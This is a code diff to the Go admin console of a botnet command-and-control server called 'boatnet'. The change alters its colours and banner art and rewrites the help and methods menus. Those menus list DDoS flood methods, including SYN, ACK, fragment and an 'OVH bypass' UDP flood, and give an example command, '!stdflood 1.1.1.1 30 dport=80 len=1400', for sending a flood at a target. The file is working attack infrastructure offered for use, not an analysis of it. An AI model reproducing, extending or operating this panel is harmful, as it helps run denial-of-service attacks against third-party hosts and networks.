@@ -87,8 +87,8 @@ func (this *Admin) Handle() {
 		}
 	}()
         this.conn.Write([]byte("\033[2J\033[1H"))
-        this.conn.Write([]byte("\x1b[1;31mWelcome to boatnet!\r\n"))
-        this.conn.Write([]byte("\x1b[1;31mtype HELP to see all commands\r\n"))
+        this.conn.Write([]byte("\x1b[1;36mWelcome to boatnet!\r\n"))
+        this.conn.Write([]byte("\x1b[1;36mtype HELP to see all commands\r\n"))
         this.conn.Write([]byte("\r\n"))
         this.conn.Write([]byte("\r\n"))
         
@@ -108,13 +108,13 @@ func (this *Admin) Handle() {
 
 		if cmd == "clear" || cmd == "cls" || cmd == "c" {
         this.conn.Write([]byte("\x1b[2J\x1b[1H"))
-        this.conn.Write([]byte("\x1b[1;31m         ,MMM\x1b[1;37m8&&&.         \r\n"))
-        this.conn.Write([]byte("\x1b[1;31m    _...MMMMM\x1b[1;37m88&&&&..._    \r\n"))
-        this.conn.Write([]byte("\x1b[1;31m .::'''MMMMM8\x1b[1;37m8&&&&&&'''::. \r\n"))
-        this.conn.Write([]byte("\x1b[1;31m::     MMMMM8\x1b[1;37m8&&&&&&     ::\r\n"))
-        this.conn.Write([]byte("\x1b[1;31m'::....MMMMM8\x1b[1;37m8&&&&&&....::'\r\n"))
-        this.conn.Write([]byte("\x1b[1;31m   `''''MMMMM\x1b[1;37m88&&&&''''`   \r\n"))
-        this.conn.Write([]byte("\x1b[1;31m         'MMM\x1b[1;37m8&&&'         \r\n"))
+        this.conn.Write([]byte("\x1b\r\n"))
+        this.conn.Write([]byte("\x1b[1;36m    |----/|                                    \x1b[0m\r\n"))         
+        this.conn.Write([]byte("\x1b[1;36m    | ,_, |                                    \x1b[0m\r\n"))
+        this.conn.Write([]byte("\x1b[1;36m     |_`_/-\x1b[1;37m..----.                   \x1b[0m\r\n"))
+        this.conn.Write([]byte("\x1b[1;36m  ___/ `   \x1b[1;37m' ,    |  \x1b[1;36mhave a \x1b[1;37mnice day\x1b[0m\r\n"))
+        this.conn.Write([]byte("\x1b[1;36m (__...'   \x1b[1;37m__|    |`.___.';          \x1b[0m\r\n"))
+        this.conn.Write([]byte("\x1b[1;36m   (_,...'(\x1b[1;37m_,.`__)/'.....+           \x1b[0m\r\n"))
     	this.conn.Write([]byte("\x1b\r\n"))
         this.conn.Write([]byte("\x1b\r\n"))
 		continue
@@ -122,26 +122,29 @@ func (this *Admin) Handle() {
 
 		if cmd == "help" || cmd == "HELP" { // display help menu
 			this.conn.Write([]byte("\r\n"))
-			this.conn.Write([]byte("\033[01;37mMETHODS\033[0m \r\n"))
-			this.conn.Write([]byte("\033[01;37mBANNERS : \033[1;37mALL BANNERS    \033[01;37m   \033[0m \r\n"))
-			this.conn.Write([]byte("\033[01;37mBOTS : \033[1;37mNUMBER BOTS    \033[01;37m      \033[0m \r\n"))
-			this.conn.Write([]byte("\033[01;37mCLEAR : \033[1;35m    \033[01;37m    \033[0m \r\n"))
+			this.conn.Write([]byte("\x1b[1;36mMETHODS\x1b[1;31m: \033[0mSHOW ALL COMMANDS \r\n"))
+			this.conn.Write([]byte("\x1b[1;36mBANNERS\x1b[1;31m: \033[0mALL BANNERS    \033[0m \r\n"))
+			this.conn.Write([]byte("\x1b[1;36mBOTS\x1b[1;31m: \033[0mNUMBER BOTS       \033[0m \r\n"))
+			this.conn.Write([]byte("\x1b[1;36mCLEAR\x1b[1;31m: \033[0mCLEAR TERMINAL   \033[0m \r\n"))
 			this.conn.Write([]byte("\r\n"))
 			continue
 		}
 
 		if cmd == "METHODS" || cmd == "methods"  || cmd == "?" { // display methods and how to send an attack
 			this.conn.Write([]byte("\r\n"))
-			this.conn.Write([]byte("\x1b[0mUsage:\x1b[1;31m !(METHOD) ip time len=1400\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;31mtcpflood: \x1b[0mTCP flood             \x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;31mcustomflood: \x1b[0mCUSTOM udp flood   \x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;31mstdflood: \x1b[0mSTD flood             \x1b[0m\r\n"))
-            this.conn.Write([]byte("\x1b[1;31mfragflood: \x1b[0mTCP FRAG Packet Flood\x1b[0m\r\n"))
-            this.conn.Write([]byte("\x1b[1;31mvseflood: \x1b[0mVSE flood             \x1b[0m\r\n"))
-            this.conn.Write([]byte("\x1b[1;31mackflood: \x1b[0mACK flood             \x1b[0m\r\n"))
-            this.conn.Write([]byte("\x1b[1;31mstompflood: \x1b[0mTCP STOMP flood     \x1b[0m\r\n"))
-            this.conn.Write([]byte("\x1b[1;31msynflood: \x1b[0mTCP SYN flood         \x1b[0m\r\n"))
-            this.conn.Write([]byte("\x1b[1;31movhbypass: \x1b[0mOVH UDP Hex flood    \x1b[0m\r\n"))
+			this.conn.Write([]byte("\x1b[1;36mPreset\x1b[1;31m:\x1b[1;31m !stdflood <target> <time>\x1b[0m\r\n"))
+            this.conn.Write([]byte("\x1b[1;36mExample\x1b[1;31m:\x1b[1;31m !stdflood 1.1.1.1 30 dport=80 len=1400\x1b[0m\r\n"))
+            this.conn.Write([]byte("\r\n"))
+			this.conn.Write([]byte("\x1b[1;36mtcpflood\x1b[1;31m: \x1b[0mTCP flood             \x1b[0m\r\n"))
+			this.conn.Write([]byte("\x1b[1;36mcustomflood\x1b[1;31m: \x1b[0mCUSTOM udp flood   \x1b[0m\r\n"))
+			this.conn.Write([]byte("\x1b[1;36mstdflood\x1b[1;31m: \x1b[0mSTD flood             \x1b[0m\r\n"))
+            this.conn.Write([]byte("\x1b[1;36mfragflood\x1b[1;31m: \x1b[0mTCP FRAG Packet Flood\x1b[0m\r\n"))
+            this.conn.Write([]byte("\x1b[1;36mvseflood\x1b[1;31m: \x1b[0mVSE flood             \x1b[0m\r\n"))
+            this.conn.Write([]byte("\x1b[1;36mackflood\x1b[1;31m: \x1b[0mACK flood             \x1b[0m\r\n"))
+            this.conn.Write([]byte("\x1b[1;36mstompflood\x1b[1;31m: \x1b[0mTCP STOMP flood     \x1b[0m\r\n"))
+            this.conn.Write([]byte("\x1b[1;36msynflood\x1b[1;31m: \x1b[0mTCP SYN flood         \x1b[0m\r\n"))
+            this.conn.Write([]byte("\x1b[1;36movhbypass\x1b[1;31m: \x1b[0mOVH UDP Hex flood    \x1b[0m\r\n"))
+			this.conn.Write([]byte("\r\n"))
 			this.conn.Write([]byte("\r\n"))
 			continue
 		}
